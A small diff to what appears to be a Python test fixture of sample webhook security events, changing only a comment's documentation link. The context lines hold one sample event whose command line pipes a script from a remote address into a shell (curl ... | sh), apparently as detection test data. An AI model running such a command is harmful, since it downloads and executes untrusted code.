@@ -209,7 +209,7 @@ def _ts(minutes_ago: int) -> str:
     return (_NOW - timedelta(minutes=minutes_ago)).isoformat()
 
 
-# Webhook events as a source would post them (see docs/integration-guide.md).
+# Webhook events as a source would post them (see docs/user-guide.md).
 _RAW_EVENTS: list[dict[str, Any]] = [
     {"timestamp": _ts(5), "host": "web01", "user": "alice", "src_ip": "203.0.113.5",
      "command_line": "curl http://198.51.100.7/x.sh | sh",
